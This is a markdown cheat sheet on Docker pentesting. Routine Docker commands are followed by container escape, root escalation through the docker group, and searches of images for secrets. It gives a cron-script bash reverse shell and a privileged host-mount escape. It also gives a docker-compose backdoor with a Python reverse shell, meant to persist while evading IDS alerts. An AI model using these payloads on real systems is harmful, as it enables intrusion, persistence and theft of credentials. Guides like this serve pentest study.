---
title: Docker Pentesting
description: Docker is a set of platform as a service products that use OS-level virtualization to deliver software in packages called containers.  Default ports are 2375, 2376.
tags:
    - Container
    - Privilege Escalation
refs:
date: 2023-03-04
draft: false
---

## Investigation

### Find Docker Binary

If we cannot use **“docker”** command by default, we need to find the docker binary.

```bash
find / -name "docker" 2>/dev/null
```

### Basic Commands

```sh
# List images
docker images
docker image ls
# The history of an image
docker image history <image-name>

# List containers running
docker container ls
# or
docker ps

# List all containers
docker container ls -a
# or
docker ps -a

# List secrets
docker secret ls
```

### Check if Containers Running

In target machine, observe the network status by running “netstat” or “ss” command.

```sh
netstat -punta
# or
ss -ltu

# -------------------------------------------------------

tcp  0  0  127.0.0.1:2375  0.0.0.0:*  LISTEN  -
```

<br />

## Basic Operations

### Run a New Container

First check the docker images listed.

```sh
docker images
```

Then run a new container from the image.

```sh
# -d: detached mode (background)
# -p: map the port of the host to the port in the container
docker run -dp 80:80 <image-name>
```

If you want to run a new container from a remote repository, run the following.

```sh 
# --rm: Removes the anonymous volumes when the container is removed
# -i: interactive
# -t: tty
# --network=host: The container is not isolated from the Docker host. The IP address is your own home IP address.
docker run --rm -it --network=host <repository>/<image>
```

### Start a Container which is stopped

```sh
# List all containers and check the target ID
docker container ls -a

# Start the container
docker container start <container-id>
```

### Run Commands in a Container

```sh
# List containers running and check the target container ID
docker ps

# Run commands by giving the container ID
docker exec <container-id> whoami
docker exec <container-id> cat sample.txt
```

### Stop a Container

```sh
# List running containers and check the target container ID
docker ps

# Stop the container by giving the ID
docker stop <container-id>
```

### Remove a Container

```sh
# List all containers and check the target container ID
docker ps -a

# Remove the container by givine the ID
docker rm <container-id>
# Force to remove the running container (-f)
docker rm -f <container-id>
```

### Build a Container Image

First off, create a **Dockerfile** in the root directory of the project.

```sh
FROM node:12-alpine

RUN apk add --no-cache python2 g++ make
WORKDIR /app
COPY . .
RUN yarn install --production
CMD ["node", "src/index.js"]
```

Now run the following command to build the container image.  
This command uses the Dockerfile.

```sh
# -t: name a tag of the image
docker build -t <tag-name> .
```

### Scan a Container Image

```sh
docker scan <image-name>
```

### Remove an Image

```sh
# List images and check the target image ID
docker images

# Remove the image by giving the ID
docker rmi <image-id>
```

### Publish an Image

Before doing below, you need to sign up the Docker Hub and sign in, then create a new repository in your dashboard.

```sh
# Login
docker login -u <your-username>

# Tag a new image
docker tag <source-image> <your-username>/<target-image>

# Push
docker push <your-username>/<target-image>
```

<br />

## Escape from a Docker Container

### Method 1. Reverse Shell over Cron Jobs

1. **Check if there is a file which runs in cron jobs. The file may be under /opt so check.**

    The file may be under /opt, so check the directory.

    ```sh
    ls -al /opt
    ```

    Assume that the **/opt/example/example.sh** runs regularly by cron jobs.

2. **Add a reverse shell payload to the script file**

    Inject the reverse shell payload to escape from the container shell.

    ```sh
    echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<local-ip>/4444 0>&1' > /opt/example/example.sh
    # or
    printf '#!/bin/bash\nbash -i >& /dev/tcp/<local-ip>/4444 0>&1' > /opt/example/example.sh
    ```

3. **Open listner for getting a shell**

    In local machine, open listener and wait until running the script by cron jobs.

    ```sh
    # In attacker machine, wait for the cron job execute the reverse shell
    nc -lvnp 4444
    ```

    We should get a shell in local machine after a while.

### Method 2. Run a Vulnerable Image

According to [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker#compromising), we can escape a docker container with the vulnerable image.  
Execute the following command in the target machine where a docker container is running..

```sh
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cd /mnt/
```

<br />

## Root Privilege Escalation (Docker Group Required)

### 1. Check if current user belongs to "docker" group

```sh
groups
```

### 2. Check the list of images available

```sh
docker images
```

### 3. Gain root shell

Replace **“alpine”** with the docker image you found.

```sh
# -v: Volumne
# --rm: Automatically remove the container when it exits
# -it: Interective and TTY
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# or

docker run -it --entrypoint=/bin/bash -v /:/mnt/ <image>:<tag>
# e.g.
docker run -it --entrypoint=/bin/bash -v /:/mnt/ alpine:master
```

After that, you can investigate sensitive information in the /mnt/ folders.

<br />

## Establish Persistence After PrivEsc

After that you invaded the docker container, you might be able to make it persistence while evading the IDS alerts by creating a docker compose file and abusing the entrypoint option to grant you a reverse shell.

Create a ~/docker-compose.yaml in the container.

You need to replace the `<image>`, `<local-ip>`, `<local-ip>` with your environment.

```yml
version: "2.1"
services:
  backdoorservice:
    restart: always
    image: <image>
    entrypoint: > 
       python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
       s.connect(("<local-ip>",<local-ip>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
       pty.spawn("/bin/sh")'
    volumes:
      - /:/mnt
    privileged: true
```

Then start listener in your local machine.

```sh
nc -lvnp 4444
```

Now run the docker compose in remote machine. You should gain a shell.

```sh
docker-compose run
```

<br />

## Amazon Elastic Container Registry (ECR) Public Gallery

### 1. Run the Docker Container

- **Retrieve a Container Image**

    ```sh
    docker pull public.ecr.aws/<registry-alias>/<repository>:latest
    ```

- **Check if It was Pulled**

    ```sh
    docker images
    ```

- **Run the Container and Interect with It**

    ```sh
    docker run -it public.ecr.aws/<registry-alias>/<repository>:latest
    ```

### 2. Get Sensitive Information in the Container

You may be able to get the interesting data like **api_key**.

```sh
printenv
```

### 3. Get Sensitive Information in Local Machine

- **Check the Container Config and Retrieve Sensitive Information**

    Process the following flows in your local machine.

    ```sh
    mkdir example
    cd example/
    docker save -o example.tar public.ecr.aws/<registry-alias>/<repository>:latest
    tar -xf example.tar

    # Config files
    cat manifest.json | jq
    cat f9ab.......json | jq

    # Also config file in each directory
    cd 2246f........../
    tar -xvf layer.tar

    # Get sensitive information
    grep -e 'token' -e 'secret' */*
    ```